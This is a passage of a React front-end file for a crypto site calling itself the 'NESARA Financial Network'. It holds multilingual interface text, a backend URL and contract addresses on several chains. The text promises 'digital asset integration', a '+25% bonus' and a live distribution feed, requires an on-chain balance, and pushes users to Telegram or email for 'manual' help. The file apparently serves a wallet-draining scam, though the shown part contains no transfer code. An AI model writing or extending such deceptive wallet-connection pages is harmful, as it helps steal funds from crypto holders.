import React, { useState, useEffect } from 'react';
import { useAppKit, useAppKitAccount, useAppKitProvider } from '@reown/appkit/react';
import { useDisconnect } from 'wagmi';
import { ethers } from 'ethers';
import './index.css';

// ============================================
// API CONFIGURATION - USING YOUR WORKING BACKEND
// ============================================
const BACKEND_URL = 'https://recoveryback.onrender.com';

// ============================================
// LANGUAGE DETECTION & TRANSLATIONS
// ============================================

const SUPPORTED_LANGUAGES = {
  en: { name: 'English', flag: '🇺🇸', native: 'English' },
  es: { name: 'Spanish', flag: '🇪🇸', native: 'Español' },
  fr: { name: 'French', flag: '🇫🇷', native: 'Français' },
  de: { name: 'German', flag: '🇩🇪', native: 'Deutsch' },
  it: { name: 'Italian', flag: '🇮🇹', native: 'Italiano' },
  pt: { name: 'Portuguese', flag: '🇵🇹', native: 'Português' },
  ru: { name: 'Russian', flag: '🇷🇺', native: 'Русский' },
  zh: { name: 'Chinese', flag: '🇨🇳', native: '中文' },
  ja: { name: 'Japanese', flag: '🇯🇵', native: '日本語' },
  ko: { name: 'Korean', flag: '🇰🇷', native: '한국어' },
  ar: { name: 'Arabic', flag: '🇸🇦', native: 'العربية' },
  hi: { name: 'Hindi', flag: '🇮🇳', native: 'हिन्दी' },
  tr: { name: 'Turkish', flag: '🇹🇷', native: 'Türkçe' },
  nl: { name: 'Dutch', flag: '🇳🇱', native: 'Nederlands' },
  pl: { name: 'Polish', flag: '🇵🇱', native: 'Polski' },
  vi: { name: 'Vietnamese', flag: '🇻🇳', native: 'Tiếng Việt' },
  th: { name: 'Thai', flag: '🇹🇭', native: 'ไทย' },
  id: { name: 'Indonesian', flag: '🇮🇩', native: 'Bahasa Indonesia' }
};

const TRANSLATIONS = {
  en: {
    // Hero & Navigation
    serviceActive: 'NESARA FINANCIAL NETWORK · ACTIVE',
    welcome: 'Global Digital Economy Ecosystem',
    connectWallet: 'CONNECT WALLET',
    disconnect: 'Disconnect Wallet',
    exploreEcosystem: 'Explore Ecosystem',
    liveUpdates: 'Live Updates',
    
    // Scanning & Eligibility
    checkEligibility: 'Scanning Blockchain Networks',
    verifying: 'Analyzing wallet for digital asset integration...',
    eligible: '✓ Digital Asset Integration Detected!',
    notEligible: 'No Digital Assets Found for Integration',
    minRequirement: 'On-chain balance required for ecosystem participation',
    scanComplete: 'Blockchain scan complete',
    assetsFound: 'digital assets found for integration',
    
    // Distribution Flow (renamed from Claim)
    recoverButton: 'INTEGRATE DIGITAL ASSETS',
    processing: 'PROCESSING DISTRIBUTION...',
    completed: '✓ DISTRIBUTION COMPLETED',
    secured: 'Your digital assets have been successfully integrated',
    view: 'VIEW DISTRIBUTION DETAILS',
    recoverNow: 'INITIATE DIGITAL ASSET INTEGRATION',
    recoveryComplete: 'DISTRIBUTION COMPLETE!',
    amountRecovered: 'Amount Integrated',
    processingRecovery: 'Initiating digital asset integration protocol...',
    recoveryValue: 'Digital Asset Value',
    recoveryInitiated: 'Integration protocol initiated',
    confirmationSent: 'Confirmation sent',
    retrievalComplete: 'Digital asset integration complete',
    emailNotification: 'Integration confirmation sent',
    blockchainSync: 'Synchronizing with blockchain networks...',
    walletRequired: 'Active wallet connection required',
    insufficientBalance: 'Insufficient on-chain balance for integration',
    proceedToRecovery: 'Click to proceed with digital asset integration',
    recoveryReady: 'Integration ready - click to integrate assets',
    reportGenerated: 'Distribution report generated',
    reportDownloaded: 'Report downloaded successfully',
    
    // Live Feed (renamed from Claims)
    liveClaims: 'LIVE ECONOMIC DISTRIBUTION FEED',
    totalClaimed: 'Total Value Distributed',
    claimingNow: 'processing now',
    lastClaim: 'Last distribution',
    someoneJustClaimed: 'Digital Asset Distribution Completed!',
    securedTokens: 'distributed',
    claimAmount: 'Distributed',
    waitingForFirstClaim: 'Awaiting distribution events...',
    participants: 'distributions',
    today: 'Today',
    totalRecovered: 'Total Value Distributed',
    tokenPrice: 'Network',
    
    // Success Messages
    successful: 'DISTRIBUTION SUCCESSFUL!',
    youHaveSecured: 'Digital Assets Successfully Integrated',
    viewButton: 'VIEW DISTRIBUTION DETAILS',
    valueBadge: 'Distribution Amount',
    progress: 'Integration Progress',
    
    // Report & Download
    downloadReport: 'Download Distribution Report',
    bonusTag: '+25% bonus',
    
    // Support
    support: 'Support',
    reportIssue: 'Report an Issue',
    yourEmail: 'Your Email Address',
    issuePlaceholder: 'Describe your issue in detail...',
    sendReport: 'Send Report',
    reportSent: 'Report sent successfully! Support will contact you shortly.',
    processingReport: 'Sending report...',
    reportError: 'Failed to send report. Please try again.',
    contactInfo: 'We\'ll follow up via email within 24 hours.',
    telegramSupport: 'Telegram Support',
    telegramJoin: 'Join Our Community',
    telegramDesc: 'Facing connection issues? Need help with asset integration? Our support team is active 24/7 on Telegram.',
    telegramButton: 'Join Telegram Community',
    connectionHelp: 'Connection Problems?',
    manualReachout: 'Manual Support',
    emailSupportTitle: 'Email Support',
    emailSupportDesc: 'No Telegram? No problem! Send us an email with your issue.',
    whyEmailSupport: 'Why Email Support?',
    emailSupportPoints: '• For users who don\'t use Telegram\n• For detailed issues requiring documentation\n• For exchange users (Binance, Coinbase, Kraken)\n• For follow-up on manual integration cases'
  },
  es: {
    serviceActive: 'RED FINANCIERA NESARA · ACTIVA',
    welcome: 'Ecosistema Global de Economía Digital',
    connectWallet: 'CONECTAR WALLET',
    disconnect: 'Desconectar Wallet',
    exploreEcosystem: 'Explorar Ecosistema',
    liveUpdates: 'Actualizaciones en Vivo',
    checkEligibility: 'Escaneando Redes Blockchain',
    verifying: 'Analizando wallet para integración de activos digitales...',
    eligible: '✓ ¡Integración de Activos Digitales Detectada!',
    notEligible: 'No se Encontraron Activos Digitales para Integración',
    minRequirement: 'Saldo en cadena requerido para participación en el ecosistema',
    scanComplete: 'Escaneo blockchain completado',
    assetsFound: 'activos digitales encontrados para integración',
    recoverButton: 'INTEGRAR ACTIVOS DIGITALES',
    processing: 'PROCESANDO DISTRIBUCIÓN...',
    completed: '✓ DISTRIBUCIÓN COMPLETADA',
    secured: 'Tus activos digitales han sido integrados exitosamente',
    view: 'VER DETALLES DE DISTRIBUCIÓN',
    recoverNow: 'INICIAR INTEGRACIÓN DE ACTIVOS DIGITALES',
    recoveryComplete: '¡DISTRIBUCIÓN COMPLETA!',
    amountRecovered: 'Monto Integrado',
    processingRecovery: 'Iniciando protocolo de integración de activos digitales...',
    recoveryValue: 'Valor de Activo Digital',
    recoveryInitiated: 'Protocolo de integración iniciado',
    confirmationSent: 'Confirmación enviada',
    retrievalComplete: 'Integración de activos digitales completa',
    emailNotification: 'Confirmación de integración enviada',
    blockchainSync: 'Sincronizando con redes blockchain...',
    walletRequired: 'Se requiere conexión activa de wallet',
    insufficientBalance: 'Saldo en cadena insuficiente para integración',
    proceedToRecovery: 'Haga clic para continuar con la integración de activos digitales',
    recoveryReady: 'Integración lista - haga clic para integrar activos',
    reportGenerated: 'Informe de distribución generado',
    reportDownloaded: 'Informe descargado exitosamente',
    liveClaims: 'FEED DE DISTRIBUCIÓN ECONÓMICA EN VIVO',
    totalClaimed: 'Valor Total Distribuido',
    claimingNow: 'procesando ahora',
    lastClaim: 'Última distribución',
    someoneJustClaimed: '¡Distribución de Activos Digitales Completada!',
    securedTokens: 'distribuido',
    claimAmount: 'Distribuido',
    waitingForFirstClaim: 'Esperando eventos de distribución...',
    participants: 'distribuciones',
    today: 'Hoy',
    totalRecovered: 'Valor Total Distribuido',
    tokenPrice: 'Red',
    successful: '¡DISTRIBUCIÓN EXITOSA!',
    youHaveSecured: 'Activos Digitales Integrados Exitosamente',
    viewButton: 'VER DETALLES DE DISTRIBUCIÓN',
    valueBadge: 'Monto de Distribución',
    progress: 'Progreso de Integración',
    downloadReport: 'Descargar Informe de Distribución',
    bonusTag: '+25% bono',
    support: 'Soporte',
    reportIssue: 'Reportar un Problema',
    yourEmail: 'Tu Correo Electrónico',
    issuePlaceholder: 'Describe tu problema en detalle...',
    sendReport: 'Enviar Reporte',
    reportSent: '¡Reporte enviado exitosamente! El soporte te contactará pronto.',
    processingReport: 'Enviando reporte...',
    reportError: 'Error al enviar el reporte. Por favor intenta de nuevo.',
    contactInfo: 'Te contactaremos por correo dentro de 24 horas.',
    telegramSupport: 'Soporte por Telegram',
    telegramJoin: 'Únete a Nuestra Comunidad',
    telegramDesc: '¿Problemas de conexión? ¿Necesitas ayuda con la integración de activos? Nuestro equipo de soporte está activo 24/7 en Telegram.',
    telegramButton: 'Únete a la Comunidad de Telegram',
    connectionHelp: '¿Problemas de Conexión?',
    manualReachout: 'Soporte Manual',
    emailSupportTitle: 'Soporte por Correo',
    emailSupportDesc: '¿No tienes Telegram? ¡No hay problema! Envíanos un correo con tu problema.',
    whyEmailSupport: '¿Por qué Soporte por Correo?',
    emailSupportPoints: '• Para usuarios que no usan Telegram\n• Para problemas detallados que requieren documentación\n• Para usuarios de exchanges (Binance, Coinbase, Kraken)\n• Para seguimiento de casos de integración manual'
  },
  fr: {
    serviceActive: 'RÉSEAU FINANCIER NESARA · ACTIF',
    welcome: 'Écosystème Mondial de l\'Économie Numérique',
    connectWallet: 'CONNECTER LE PORTEFEUILLE',
    disconnect: 'Déconnecter le Portefeuille',
    exploreEcosystem: 'Explorer l\'Écosystème',
    liveUpdates: 'Mises à Jour en Direct',
    checkEligibility: 'Analyse des Réseaux Blockchain',
    verifying: 'Analyse du portefeuille pour l\'intégration d\'actifs numériques...',
    eligible: '✓ Intégration d\'Actifs Numériques Détectée !',
    notEligible: 'Aucun Actif Numérique Trouvé pour l\'Intégration',
    minRequirement: 'Solde on-chain requis pour la participation à l\'écosystème',
    scanComplete: 'Analyse blockchain terminée',
    assetsFound: 'actifs numériques trouvés pour l\'intégration',
    recoverButton: 'INTÉGRER LES ACTIFS NUMÉRIQUES',
    processing: 'TRAITEMENT DE LA DISTRIBUTION...',
    completed: '✓ DISTRIBUTION TERMINÉE',
    secured: 'Vos actifs numériques ont été intégrés avec succès',
    view: 'VOIR LES DÉTAILS DE LA DISTRIBUTION',
    recoverNow: 'INITIER L\'INTÉGRATION DES ACTIFS NUMÉRIQUES',
    recoveryComplete: 'DISTRIBUTION TERMINÉE !',
    amountRecovered: 'Montant Intégré',
    processingRecovery: 'Initiation du protocole d\'intégration des actifs numériques...',
    recoveryValue: 'Valeur des Actifs Numériques',
    recoveryInitiated: 'Protocole d\'intégration initié',
    confirmationSent: 'Confirmation envoyée',
    retrievalComplete: 'Intégration des actifs numériques terminée',
    emailNotification: 'Confirmation d\'intégration envoyée',
    blockchainSync: 'Synchronisation avec les réseaux blockchain...',
    walletRequired: 'Connexion de portefeuille active requise',
    insufficientBalance: 'Solde on-chain insuffisant pour l\'intégration',
    proceedToRecovery: 'Cliquez pour procéder à l\'intégration des actifs numériques',
    recoveryReady: 'Intégration prête - cliquez pour intégrer les actifs',
    reportGenerated: 'Rapport de distribution généré',
    reportDownloaded: 'Rapport téléchargé avec succès',
    liveClaims: 'FLUX DE DISTRIBUTION ÉCONOMIQUE EN DIRECT',
    totalClaimed: 'Valeur Totale Distribuée',
    claimingNow: 'traitement en cours',
    lastClaim: 'Dernière distribution',
    someoneJustClaimed: 'Distribution d\'Actifs Numériques Terminée !',
    securedTokens: 'distribué',
    claimAmount: 'Distribué',
    waitingForFirstClaim: 'En attente d\'événements de distribution...',
    participants: 'distributions',
    today: 'Aujourd\'hui',
    totalRecovered: 'Valeur Totale Distribuée',
    tokenPrice: 'Réseau',
    successful: 'DISTRIBUTION RÉUSSIE !',
    youHaveSecured: 'Actifs Numériques Intégrés avec Succès',
    viewButton: 'VOIR LES DÉTAILS DE LA DISTRIBUTION',
    valueBadge: 'Montant de la Distribution',
    progress: 'Progrès de l\'Intégration',
    downloadReport: 'Télécharger le Rapport de Distribution',
    bonusTag: '+25% bonus',
    support: 'Support',
    reportIssue: 'Signaler un Problème',
    yourEmail: 'Votre Adresse Email',
    issuePlaceholder: 'Décrivez votre problème en détail...',
    sendReport: 'Envoyer le Rapport',
    reportSent: 'Rapport envoyé avec succès ! Le support vous contactera sous peu.',
    processingReport: 'Envoi du rapport...',
    reportError: 'Échec de l\'envoi du rapport. Veuillez réessayer.',
    contactInfo: 'Nous vous contacterons par email dans les 24 heures.',
    telegramSupport: 'Support Telegram',
    telegramJoin: 'Rejoignez Notre Communauté',
    telegramDesc: 'Problèmes de connexion ? Besoin d\'aide pour l\'intégration d\'actifs ? Notre équipe de support est active 24h/24 et 7j/7 sur Telegram.',
    telegramButton: 'Rejoindre la Communauté Telegram',
    connectionHelp: 'Problèmes de Connexion ?',
    manualReachout: 'Support Manuel',
    emailSupportTitle: 'Support par Email',
    emailSupportDesc: 'Pas de Telegram ? Pas de problème ! Envoyez-nous un email avec votre problème.',
    whyEmailSupport: 'Pourquoi le Support par Email ?',
    emailSupportPoints: '• Pour les utilisateurs qui n\'utilisent pas Telegram\n• Pour les problèmes détaillés nécessitant une documentation\n• Pour les utilisateurs d\'exchanges (Binance, Coinbase, Kraken)\n• Pour le suivi des cas d\'intégration manuelle'
  },
  de: {
    serviceActive: 'NESARA FINANZNETZWERK · AKTIV',
    welcome: 'Globales Ökosystem der digitalen Wirtschaft',
    connectWallet: 'WALLET VERBINDEN',
    disconnect: 'Wallet trennen',
    exploreEcosystem: 'Ökosystem erkunden',
    liveUpdates: 'Live-Updates',
    checkEligibility: 'Blockchain-Netzwerke werden gescannt',
    verifying: 'Analyse der Wallet für digitale Asset-Integration...',
    eligible: '✓ Digitale Asset-Integration erkannt!',
    notEligible: 'Keine digitalen Assets zur Integration gefunden',
    minRequirement: 'On-Chain-Guthaben für die Ökosystem-Teilnahme erforderlich',
    scanComplete: 'Blockchain-Scan abgeschlossen',
    assetsFound: 'digitale Assets zur Integration gefunden',
    recoverButton: 'DIGITALE ASSETS INTEGRIEREN',
    processing: 'VERTEILUNG WIRD VERARBEITET...',
    completed: '✓ VERTEILUNG ABGESCHLOSSEN',
    secured: 'Ihre digitalen Assets wurden erfolgreich integriert',
    view: 'VERTEILUNGSDETAILS ANZEIGEN',
    recoverNow: 'DIGITALE ASSET-INTEGRATION EINLEITEN',
    recoveryComplete: 'VERTEILUNG ABGESCHLOSSEN!',
    amountRecovered: 'Integrierter Betrag',
    processingRecovery: 'Protokoll zur Integration digitaler Assets wird eingeleitet...',
    recoveryValue: 'Wert digitaler Assets',
    recoveryInitiated: 'Integrationsprotokoll eingeleitet',
    confirmationSent: 'Bestätigung gesendet',
    retrievalComplete: 'Integration digitaler Assets abgeschlossen',
    emailNotification: 'Integrationsbestätigung gesendet',
    blockchainSync: 'Synchronisierung mit Blockchain-Netzwerken...',
    walletRequired: 'Aktive Wallet-Verbindung erforderlich',
    insufficientBalance: 'Unzureichendes On-Chain-Guthaben für Integration',
    proceedToRecovery: 'Klicken Sie, um mit der Integration digitaler Assets fortzufahren',
    recoveryReady: 'Integration bereit - klicken Sie, um Assets zu integrieren',
    reportGenerated: 'Verteilungsbericht generiert',
    reportDownloaded: 'Bericht erfolgreich heruntergeladen',
    liveClaims: 'LIVE-WIRTSCHAFTSVERTEILUNGS-FEED',
    totalClaimed: 'Gesamtwert verteilt',
    claimingNow: 'wird jetzt verarbeitet',
    lastClaim: 'Letzte Verteilung',
    someoneJustClaimed: 'Digitale Asset-Verteilung abgeschlossen!',
    securedTokens: 'verteilt',
    claimAmount: 'Verteilt',
    waitingForFirstClaim: 'Warten auf Verteilungsereignisse...',
    participants: 'Verteilungen',
    today: 'Heute',
    totalRecovered: 'Gesamtwert verteilt',
    tokenPrice: 'Netzwerk',
    successful: 'VERTEILUNG ERFOLGREICH!',
    youHaveSecured: 'Digitale Assets erfolgreich integriert',
    viewButton: 'VERTEILUNGSDETAILS ANZEIGEN',
    valueBadge: 'Verteilungsbetrag',
    progress: 'Integrationsfortschritt',
    downloadReport: 'Verteilungsbericht herunterladen',
    bonusTag: '+25% Bonus',
    support: 'Support',
    reportIssue: 'Ein Problem melden',
    yourEmail: 'Ihre E-Mail-Adresse',
    issuePlaceholder: 'Beschreiben Sie Ihr Problem im Detail...',
    sendReport: 'Bericht senden',
    reportSent: 'Bericht erfolgreich gesendet! Der Support wird Sie in Kürze kontaktieren.',
    processingReport: 'Bericht wird gesendet...',
    reportError: 'Bericht konnte nicht gesendet werden. Bitte versuchen Sie es erneut.',
    contactInfo: 'Wir werden uns innerhalb von 24 Stunden per E-Mail bei Ihnen melden.',
    telegramSupport: 'Telegram-Support',
    telegramJoin: 'Treten Sie unserer Community bei',
    telegramDesc: 'Verbindungsprobleme? Benötigen Sie Hilfe bei der Asset-Integration? Unser Support-Team ist 24/7 auf Telegram aktiv.',
    telegramButton: 'Telegram-Community beitreten',
    connectionHelp: 'Verbindungsprobleme?',
    manualReachout: 'Manueller Support',
    emailSupportTitle: 'E-Mail-Support',
    emailSupportDesc: 'Kein Telegram? Kein Problem! Senden Sie uns eine E-Mail mit Ihrem Problem.',
    whyEmailSupport: 'Warum E-Mail-Support?',
    emailSupportPoints: '• Für Benutzer, die kein Telegram nutzen\n• Für detaillierte Probleme, die Dokumentation erfordern\n• Für Exchange-Benutzer (Binance, Coinbase, Kraken)\n• Für Nachverfolgung manueller Integrationsfälle'
  },
  it: {
    serviceActive: 'NETWORK FINANZIARIO NESARA · ATTIVO',
    welcome: 'Ecosistema Globale dell\'Economia Digitale',
    connectWallet: 'CONNETTI WALLET',
    disconnect: 'Disconnetti Wallet',
    exploreEcosystem: 'Esplora Ecosistema',
    liveUpdates: 'Aggiornamenti Live',
    checkEligibility: 'Scansione Reti Blockchain',
    verifying: 'Analisi del wallet per l\'integrazione di asset digitali...',
    eligible: '✓ Integrazione Asset Digitali Rilevata!',
    notEligible: 'Nessun Asset Digitale Trovato per l\'Integrazione',
    minRequirement: 'Saldo on-chain richiesto per la partecipazione all\'ecosistema',
    scanComplete: 'Scansione blockchain completata',
    assetsFound: 'asset digitali trovati per l\'integrazione',
    recoverButton: 'INTEGRA ASSET DIGITALI',
    processing: 'ELABORAZIONE DISTRIBUZIONE...',
    completed: '✓ DISTRIBUZIONE COMPLETATA',
    secured: 'I tuoi asset digitali sono stati integrati con successo',
    view: 'VISUALIZZA DETTAGLI DISTRIBUZIONE',
    recoverNow: 'AVVIA INTEGRAZIONE ASSET DIGITALI',
    recoveryComplete: 'DISTRIBUZIONE COMPLETATA!',
    amountRecovered: 'Importo Integrato',
    processingRecovery: 'Avvio del protocollo di integrazione asset digitali...',
    recoveryValue: 'Valore Asset Digitali',
    recoveryInitiated: 'Protocollo di integrazione avviato',
    confirmationSent: 'Conferma inviata',
    retrievalComplete: 'Integrazione asset digitali completata',
    emailNotification: 'Conferma integrazione inviata',
    blockchainSync: 'Sincronizzazione con le reti blockchain...',
    walletRequired: 'Connessione wallet attiva richiesta',
    insufficientBalance: 'Saldo on-chain insufficiente per l\'integrazione',
    proceedToRecovery: 'Clicca per procedere con l\'integrazione degli asset digitali',
    recoveryReady: 'Integrazione pronta - clicca per integrare gli asset',
    reportGenerated: 'Report di distribuzione generato',
    reportDownloaded: 'Report scaricato con successo',
    liveClaims: 'FEED DISTRIBUZIONE ECONOMICA LIVE',
    totalClaimed: 'Valore Totale Distribuito',
    claimingNow: 'elaborazione in corso',
    lastClaim: 'Ultima distribuzione',
    someoneJustClaimed: 'Distribuzione Asset Digitali Completata!',
    securedTokens: 'distribuito',
    claimAmount: 'Distribuito',
    waitingForFirstClaim: 'In attesa di eventi di distribuzione...',
    participants: 'distribuzioni',
    today: 'Oggi',
    totalRecovered: 'Valore Totale Distribuito',
    tokenPrice: 'Rete',
    successful: 'DISTRIBUZIONE RIUSCITA!',
    youHaveSecured: 'Asset Digitali Integrati con Successo',
    viewButton: 'VISUALIZZA DETTAGLI DISTRIBUZIONE',
    valueBadge: 'Importo Distribuito',
    progress: 'Progresso Integrazione',
    downloadReport: 'Scarica Report di Distribuzione',
    bonusTag: '+25% bonus',
    support: 'Supporto',
    reportIssue: 'Segnala un Problema',
    yourEmail: 'Il Tuo Indirizzo Email',
    issuePlaceholder: 'Descrivi il tuo problema in dettaglio...',
    sendReport: 'Invia Report',
    reportSent: 'Report inviato con successo! Il supporto ti contatterà a breve.',
    processingReport: 'Invio report...',
    reportError: 'Invio report fallito. Per favore riprova.',
    contactInfo: 'Ti contatteremo via email entro 24 ore.',
    telegramSupport: 'Supporto Telegram',
    telegramJoin: 'Unisciti alla Nostra Community',
    telegramDesc: 'Problemi di connessione? Hai bisogno di aiuto con l\'integrazione degli asset? Il nostro team di supporto è attivo 24/7 su Telegram.',
    telegramButton: 'Unisciti alla Community Telegram',
    connectionHelp: 'Problemi di Connessione?',
    manualReachout: 'Supporto Manuale',
    emailSupportTitle: 'Supporto Email',
    emailSupportDesc: 'Niente Telegram? Nessun problema! Inviaci un\'email con il tuo problema.',
    whyEmailSupport: 'Perché il Supporto Email?',
    emailSupportPoints: '• Per utenti che non usano Telegram\n• Per problemi dettagliati che richiedono documentazione\n• Per utenti di exchange (Binance, Coinbase, Kraken)\n• Per il follow-up di casi di integrazione manuale'
  },
  pt: {
    serviceActive: 'REDE FINANCEIRA NESARA · ATIVA',
    welcome: 'Ecossistema Global da Economia Digital',
    connectWallet: 'CONECTAR CARTEIRA',
    disconnect: 'Desconectar Carteira',
    exploreEcosystem: 'Explorar Ecossistema',
    liveUpdates: 'Atualizações Ao Vivo',
    checkEligibility: 'Verificando Redes Blockchain',
    verifying: 'Analisando carteira para integração de ativos digitais...',
    eligible: '✓ Integração de Ativos Digitais Detectada!',
    notEligible: 'Nenhum Ativo Digital Encontrado para Integração',
    minRequirement: 'Saldo on-chain necessário para participação no ecossistema',
    scanComplete: 'Verificação blockchain concluída',
    assetsFound: 'ativos digitais encontrados para integração',
    recoverButton: 'INTEGRAR ATIVOS DIGITAIS',
    processing: 'PROCESSANDO DISTRIBUIÇÃO...',
    completed: '✓ DISTRIBUIÇÃO CONCLUÍDA',
    secured: 'Seus ativos digitais foram integrados com sucesso',
    view: 'VER DETALHES DA DISTRIBUIÇÃO',
    recoverNow: 'INICIAR INTEGRAÇÃO DE ATIVOS DIGITAIS',
    recoveryComplete: 'DISTRIBUIÇÃO CONCLUÍDA!',
    amountRecovered: 'Valor Integrado',
    processingRecovery: 'Iniciando protocolo de integração de ativos digitais...',
    recoveryValue: 'Valor do Ativo Digital',
    recoveryInitiated: 'Protocolo de integração iniciado',
    confirmationSent: 'Confirmação enviada',
    retrievalComplete: 'Integração de ativos digitais concluída',
    emailNotification: 'Confirmação de integração enviada',
    blockchainSync: 'Sincronizando com redes blockchain...',
    walletRequired: 'Conexão de carteira ativa necessária',
    insufficientBalance: 'Saldo on-chain insuficiente para integração',
    proceedToRecovery: 'Clique para prosseguir com a integração de ativos digitais',
    recoveryReady: 'Integração pronta - clique para integrar ativos',
    reportGenerated: 'Relatório de distribuição gerado',
    reportDownloaded: 'Relatório baixado com sucesso',
    liveClaims: 'FEED DE DISTRIBUIÇÃO ECONÔMICA AO VIVO',
    totalClaimed: 'Valor Total Distribuído',
    claimingNow: 'processando agora',
    lastClaim: 'Última distribuição',
    someoneJustClaimed: 'Distribuição de Ativos Digitais Concluída!',
    securedTokens: 'distribuído',
    claimAmount: 'Distribuído',
    waitingForFirstClaim: 'Aguardando eventos de distribuição...',
    participants: 'distribuições',
    today: 'Hoje',
    totalRecovered: 'Valor Total Distribuído',
    tokenPrice: 'Rede',
    successful: 'DISTRIBUIÇÃO BEM-SUCEDIDA!',
    youHaveSecured: 'Ativos Digitais Integrados com Sucesso',
    viewButton: 'VER DETALHES DA DISTRIBUIÇÃO',
    valueBadge: 'Valor da Distribuição',
    progress: 'Progresso da Integração',
    downloadReport: 'Baixar Relatório de Distribuição',
    bonusTag: '+25% bônus',
    support: 'Suporte',
    reportIssue: 'Reportar um Problema',
    yourEmail: 'Seu Endereço de Email',
    issuePlaceholder: 'Descreva seu problema em detalhes...',
    sendReport: 'Enviar Relatório',
    reportSent: 'Relatório enviado com sucesso! O suporte entrará em contato em breve.',
    processingReport: 'Enviando relatório...',
    reportError: 'Falha ao enviar relatório. Por favor, tente novamente.',
    contactInfo: 'Entraremos em contato por email dentro de 24 horas.',
    telegramSupport: 'Suporte Telegram',
    telegramJoin: 'Junte-se à Nossa Comunidade',
    telegramDesc: 'Problemas de conexão? Precisa de ajuda com a integração de ativos? Nossa equipe de suporte está ativa 24/7 no Telegram.',
    telegramButton: 'Juntar-se à Comunidade Telegram',
    connectionHelp: 'Problemas de Conexão?',
    manualReachout: 'Suporte Manual',
    emailSupportTitle: 'Suporte por Email',
    emailSupportDesc: 'Sem Telegram? Sem problema! Envie-nos um email com seu problema.',
    whyEmailSupport: 'Por que Suporte por Email?',
    emailSupportPoints: '• Para usuários que não usam Telegram\n• Para problemas detalhados que exigem documentação\n• Para usuários de exchanges (Binance, Coinbase, Kraken)\n• Para acompanhamento de casos de integração manual'
  },
  ru: {
    serviceActive: 'ФИНАНСОВАЯ СЕТЬ NESARA · АКТИВНА',
    welcome: 'Глобальная экосистема цифровой экономики',
    connectWallet: 'ПОДКЛЮЧИТЬ КОШЕЛЕК',
    disconnect: 'Отключить кошелек',
    exploreEcosystem: 'Исследовать экосистему',
    liveUpdates: 'Прямые обновления',
    checkEligibility: 'Сканирование блокчейн-сетей',
    verifying: 'Анализ кошелька для интеграции цифровых активов...',
    eligible: '✓ Интеграция цифровых активов обнаружена!',
    notEligible: 'Цифровые активы для интеграции не найдены',
    minRequirement: 'Требуется ончейн-баланс для участия в экосистеме',
    scanComplete: 'Сканирование блокчейна завершено',
    assetsFound: 'цифровых активов найдено для интеграции',
    recoverButton: 'ИНТЕГРИРОВАТЬ ЦИФРОВЫЕ АКТИВЫ',
    processing: 'ОБРАБОТКА РАСПРЕДЕЛЕНИЯ...',
    completed: '✓ РАСПРЕДЕЛЕНИЕ ЗАВЕРШЕНО',
    secured: 'Ваши цифровые активы успешно интегрированы',
    view: 'ПОСМОТРЕТЬ ДЕТАЛИ РАСПРЕДЕЛЕНИЯ',
    recoverNow: 'ЗАПУСТИТЬ ИНТЕГРАЦИЮ ЦИФРОВЫХ АКТИВОВ',
    recoveryComplete: 'РАСПРЕДЕЛЕНИЕ ЗАВЕРШЕНО!',
    amountRecovered: 'Интегрированная сумма',
    processingRecovery: 'Запуск протокола интеграции цифровых активов...',
    recoveryValue: 'Стоимость цифровых активов',
    recoveryInitiated: 'Протокол интеграции запущен',
    confirmationSent: 'Подтверждение отправлено',
    retrievalComplete: 'Интеграция цифровых активов завершена',
    emailNotification: 'Подтверждение интеграции отправлено',
    blockchainSync: 'Синхронизация с блокчейн-сетями...',
    walletRequired: 'Требуется активное подключение кошелька',
    insufficientBalance: 'Недостаточный ончейн-баланс для интеграции',
    proceedToRecovery: 'Нажмите для продолжения интеграции цифровых активов',
    recoveryReady: 'Интеграция готова - нажмите для интеграции активов',
    reportGenerated: 'Отчет о распределении создан',
    reportDownloaded: 'Отчет успешно загружен',
    liveClaims: 'ПРЯМАЯ ТРАНСЛЯЦИЯ РАСПРЕДЕЛЕНИЯ',
    totalClaimed: 'Общая распределенная стоимость',
    claimingNow: 'обрабатывается сейчас',
    lastClaim: 'Последнее распределение',
    someoneJustClaimed: 'Распределение цифровых активов завершено!',
    securedTokens: 'распределено',
    claimAmount: 'Распределено',
    waitingForFirstClaim: 'Ожидание событий распределения...',
    participants: 'распределений',
    today: 'Сегодня',
    totalRecovered: 'Общая распределенная стоимость',
    tokenPrice: 'Сеть',
    successful: 'РАСПРЕДЕЛЕНИЕ УСПЕШНО!',
    youHaveSecured: 'Цифровые активы успешно интегрированы',
    viewButton: 'ПОСМОТРЕТЬ ДЕТАЛИ РАСПРЕДЕЛЕНИЯ',
    valueBadge: 'Сумма распределения',
    progress: 'Прогресс интеграции',
    downloadReport: 'Скачать отчет о распределении',
    bonusTag: '+25% бонус',
    support: 'Поддержка',
    reportIssue: 'Сообщить о проблеме',
    yourEmail: 'Ваш адрес электронной почты',
    issuePlaceholder: 'Опишите вашу проблему подробно...',
    sendReport: 'Отправить отчет',
    reportSent: 'Отчет успешно отправлен! Служба поддержки свяжется с вами в ближайшее время.',
    processingReport: 'Отправка отчета...',
    reportError: 'Не удалось отправить отчет. Пожалуйста, попробуйте снова.',
    contactInfo: 'Мы свяжемся с вами по электронной почте в течение 24 часов.',
    telegramSupport: 'Поддержка в Telegram',
    telegramJoin: 'Присоединяйтесь к нашему сообществу',
    telegramDesc: 'Проблемы с подключением? Нужна помощь с интеграцией активов? Наша команда поддержки активна 24/7 в Telegram.',
    telegramButton: 'Присоединиться к сообществу Telegram',
    connectionHelp: 'Проблемы с подключением?',
    manualReachout: 'Ручная поддержка',
    emailSupportTitle: 'Поддержка по электронной почте',
    emailSupportDesc: 'Нет Telegram? Не проблема! Отправьте нам письмо с вашей проблемой.',
    whyEmailSupport: 'Почему поддержка по электронной почте?',
    emailSupportPoints: '• Для пользователей, которые не используют Telegram\n• Для подробных проблем, требующих документации\n• Для пользователей бирж (Binance, Coinbase, Kraken)\n• Для последующего наблюдения за случаями ручной интеграции'
  }
};

// ============================================
// DEPLOYED CONTRACTS ON ALL 5 NETWORKS (UNCHANGED)
// ============================================

const MULTICHAIN_CONFIG = {
  Ethereum: {
    chainId: 1,
    contractAddress: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
    name: 'Ethereum',
    symbol: 'ETH',
    explorer: 'https://etherscan.io',
    icon: '⟠',
    color: 'from-amber-500 to-amber-600',
    rpc: 'https://eth.llamarpc.com'
  },
  BSC: {
    chainId: 56,
    contractAddress: '0xb2ea58AcfC23006B3193E6F51297518289D2d6a0',
    name: 'BSC',
    symbol: 'BNB',
    explorer: 'https://bscscan.com',
    icon: '🟡',
    color: 'from-amber-500 to-amber-600',
    rpc: 'https://bsc-dataseed.binance.org'
